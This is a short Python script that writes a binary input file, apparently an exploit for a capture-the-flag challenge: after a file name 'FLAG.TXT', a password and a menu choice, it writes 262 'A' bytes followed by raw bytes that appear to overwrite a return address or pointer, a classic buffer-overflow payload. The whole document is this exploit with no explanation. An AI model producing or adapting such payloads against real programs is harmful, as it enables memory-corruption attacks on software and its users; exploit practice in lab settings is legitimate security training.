with open('payload.txt', "wb") as f:
    f.write("FLAG.TXT\n")
    f.write("supersneaky2020\n")
    f.write("C\r\n")
    f.write("A" * 262 + "\x7d\xea" + "\x20\x1c" + "\xd5\x0b" + "\n\n")
    f.write("L\n")

